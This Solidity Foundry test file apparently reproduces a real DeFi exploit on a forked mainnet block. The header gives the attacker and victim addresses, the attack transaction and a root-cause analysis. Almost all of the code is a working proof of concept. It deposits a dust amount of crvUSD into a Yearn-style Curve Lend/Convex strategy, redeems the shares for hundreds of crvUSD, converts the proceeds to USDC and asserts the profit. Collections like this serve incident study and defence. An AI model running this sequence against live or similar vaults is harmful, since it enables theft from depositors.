// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "../basetest.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : 563.12 USDC
// Attacker : 0x29Bd2258485Da9f4224A99c512e14D4F64d81a50
// Attack Contract : 0x2114Ab8Bb9b69545A5C0923E63687Ee8CdAd269E
// Vulnerable Contract : 0x75b7DB3e11138134fe4744553b5e5e3D6546d289
// Attack Tx : https://etherscan.io/tx/0x2ff7c23dca7e9a86c70004696802cbd37d6a77fc4f3e02522b16617045b764f6
//
// @Info
// Vulnerable Contract Code : https://etherscan.io/address/0x75b7DB3e11138134fe4744553b5e5e3D6546d289#code
//
// @Analysis
// Twitter Guy : https://t.me/defimon_alerts/1495
//
// Attack summary: A tiny crvUSD deposit into the Yearn strategy was routed into a Curve Lend
// vault and staked in Convex. Redeeming the minted strategy shares caused the strategy to
// unstake and redeem far more crvUSD from the Curve Lend vault than the attacker deposited.
// Root cause: The permissionless strategy deposit/redeem path trusted the underlying Curve Lend
// vault share accounting and accepted the realized withdrawal loss, letting the redeemer receive
// hundreds of crvUSD for a dust-sized deposit.

address constant ATTACKER = 0x29Bd2258485Da9f4224A99c512e14D4F64d81a50;
address constant TRACE_ATTACK_CONTRACT = 0x2114Ab8Bb9b69545A5C0923E63687Ee8CdAd269E;
address constant STRATEGY = 0x75b7DB3e11138134fe4744553b5e5e3D6546d289;
address constant STRATEGY_IMPLEMENTATION = 0xD377919FA87120584B21279a491F82D5265A139c;
address constant CRVUSD_CONTROLLER = 0xaD444663c6C92B497225c6cE65feE2E7F78BFb86;
address constant CRVUSD_TOKEN = 0xf939E0A03FB07F59A73314E73794Be0E57ac1b4E;
address constant USDC_TOKEN = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
address constant UNISWAP_V3_ROUTER = 0xE592427A0AEce92De3Edee1F18E0157C05861564;
address constant CRVUSD_USDC_CURVE_POOL = 0x4DEcE678ceceb27446b35C672dC7d61F30bAD69E;
address constant USDC_CRVUSD_UNISWAP_POOL = 0x084565106618419274Beed1B4aD4BdFF77C5f90F;

interface ITokenizedStrategy {
    function deposit(uint256 assets, address receiver) external returns (uint256 shares);
    function redeem(uint256 shares, address receiver, address owner) external returns (uint256 assets);
}

interface ICurveStableSwap {
    function exchange(int128 i, int128 j, uint256 dx, uint256 minDy) external returns (uint256);
}

contract ContractTest is BaseTestWithBalanceLog {
    function setUp() public {
        uint256 forkBlock = 22_929_492;
        vm.createSelectFork("mainnet", forkBlock);

        fundingToken = USDC_TOKEN;

        vm.label(ATTACKER, "Attacker EOA");
        vm.label(TRACE_ATTACK_CONTRACT, "Trace Attack Contract");
        vm.label(STRATEGY, "StrategyLlamaLendConvex");
        vm.label(STRATEGY_IMPLEMENTATION, "TokenizedStrategy Implementation");
        vm.label(CRVUSD_CONTROLLER, "crvUSD Controller");
        vm.label(CRVUSD_TOKEN, "crvUSD");
        vm.label(USDC_TOKEN, "USDC");
        vm.label(UNISWAP_V3_ROUTER, "Uniswap V3 Router");
        vm.label(CRVUSD_USDC_CURVE_POOL, "crvUSD/USDC Curve Pool");
        vm.label(USDC_CRVUSD_UNISWAP_POOL, "USDC/crvUSD Uniswap V3 Pool");
    }

    function testExploit() public balanceLog {
        uint256 seedUsdc = 124;
        deal(USDC_TOKEN, address(this), seedUsdc);

        uint256 usdcBefore = IERC20(USDC_TOKEN).balanceOf(address(this));

        // step 1: swap the dust USDC seed into crvUSD, matching the trace's seed funding.
        IERC20(USDC_TOKEN).approve(UNISWAP_V3_ROUTER, seedUsdc);
        uint256 crvUsdSeed = Uni_Router_V3(UNISWAP_V3_ROUTER).exactInputSingle(
            Uni_Router_V3.ExactInputSingleParams({
                tokenIn: USDC_TOKEN,
                tokenOut: CRVUSD_TOKEN,
                fee: 3000,
                recipient: address(this),
                deadline: block.timestamp,
                amountIn: seedUsdc,
                amountOutMinimum: 0,
                sqrtPriceLimitX96: 0
            })
        );

        // step 2: deposit the crvUSD into the strategy; the minted shares are derived here.
        IERC20(CRVUSD_TOKEN).approve(STRATEGY, crvUsdSeed);
        uint256 strategyShares = ITokenizedStrategy(STRATEGY).deposit(crvUsdSeed, address(this));

        // step 3: redeem the just-minted strategy shares and receive the inflated crvUSD output.
        uint256 crvUsdBeforeRedeem = IERC20(CRVUSD_TOKEN).balanceOf(address(this));
        ITokenizedStrategy(STRATEGY).redeem(strategyShares, address(this), address(this));
        uint256 crvUsdRedeemed = IERC20(CRVUSD_TOKEN).balanceOf(address(this)) - crvUsdBeforeRedeem;

        // step 4: convert the crvUSD proceeds back to USDC through the same Curve pool.
        IERC20(CRVUSD_TOKEN).approve(CRVUSD_USDC_CURVE_POOL, crvUsdRedeemed);
        ICurveStableSwap(CRVUSD_USDC_CURVE_POOL).exchange(1, 0, crvUsdRedeemed, 0);

        uint256 usdcAfter = IERC20(USDC_TOKEN).balanceOf(address(this));
        assertGt(crvUsdRedeemed, crvUsdSeed * 1_000_000);
        assertGt(usdcAfter - usdcBefore, 500e6);
    }
}
